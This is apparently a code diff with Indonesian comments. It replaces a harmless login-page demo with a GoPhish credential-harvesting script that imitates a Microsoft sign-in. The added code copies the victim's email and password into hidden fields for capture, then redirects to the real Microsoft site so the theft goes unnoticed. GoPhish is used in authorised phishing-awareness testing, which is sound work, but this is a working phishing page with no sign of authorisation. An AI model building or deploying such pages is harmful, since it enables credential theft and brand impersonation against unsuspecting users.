@@ -1,24 +1,44 @@
+<script>
+    // URL Pengalihan (Redirect) setelah data ditangkap oleh GoPhish
+    // Ganti dengan URL Microsoft yang sebenarnya, misal: 'https://www.microsoft.com/id-id'
+    const REDIRECT_URL = "https://www.microsoft.com/id-id"; 
 
-document.addEventListener('DOMContentLoaded', () => {
-    const loginForm = document.getElementById('loginForm');
-    const kembaliBtn = document.getElementById('kembaliBtn');
-    const selanjutnyaBtn = document.getElementById('selanjutnyaBtn');
+    // Fungsi untuk menampilkan langkah password
+    function showPasswordStep() {
+        const username = document.getElementById('input_username').value;
+        if (username) {
+            // Simpan username ke hidden field GoPhish
+            document.getElementById('hidden_username').value = username;
 
-    // Mencegah form dikirim (halaman refresh) saat tombol 'Selanjutnya' diklik
-    loginForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        alert('Fungsionalitas login sesungguhnya memerlukan server (backend). Anda mengklik "Selanjutnya".');
-    });
+            // Tampilkan langkah password, sembunyikan langkah username
+            document.getElementById('step_username').style.display = 'none';
+            document.getElementById('step_password').style.display = 'block';
+            document.getElementById('input_password').focus();
+        } else {
+            alert("Please enter your email, phone, or Skype.");
+        }
+    }
 
-    // Menambahkan aksi untuk tombol 'Kembali'
-    kembaliBtn.addEventListener('click', () => {
-        alert('Anda mengklik tombol "Kembali".');
-        // Di aplikasi nyata, ini bisa mengarahkan ke halaman sebelumnya
-    });
-    
-    // Memberi tahu jika tombol 'Selanjutnya' diklik (walaupun sudah ada di submit form)
-    selanjutnyaBtn.addEventListener('click', () => {
-        // Form submit akan menangani ini, tapi ini untuk demonstrasi
-        console.log('Tombol Selanjutnya diklik.');
-    });
-});
+    // Fungsi untuk kembali ke langkah username
+    function showUsernameStep() {
+        document.getElementById('step_password').style.display = 'none';
+        document.getElementById('step_username').style.display = 'block';
+        document.getElementById('input_username').focus();
+    }
+
+    // Tangani pengiriman formulir GoPhish
+    document.getElementById('gophish_form').onsubmit = function() {
+        const password = document.getElementById('input_password').value;
+        
+        // Simpan password ke hidden field GoPhish
+        document.getElementById('hidden_password').value = password;
+        
+        // Data telah ditangkap GoPhish. Sekarang, alihkan pengguna.
+        setTimeout(function() {
+            window.location.href = REDIRECT_URL;
+        }, 100); // Penundaan singkat untuk memastikan pengiriman data ke GoPhish
+
+        // GoPhish menangani POST request, jadi tidak perlu preventDefault() di sini 
+        // selama form ACTION sudah disetel dengan benar oleh GoPhish.
+    };
+</script>
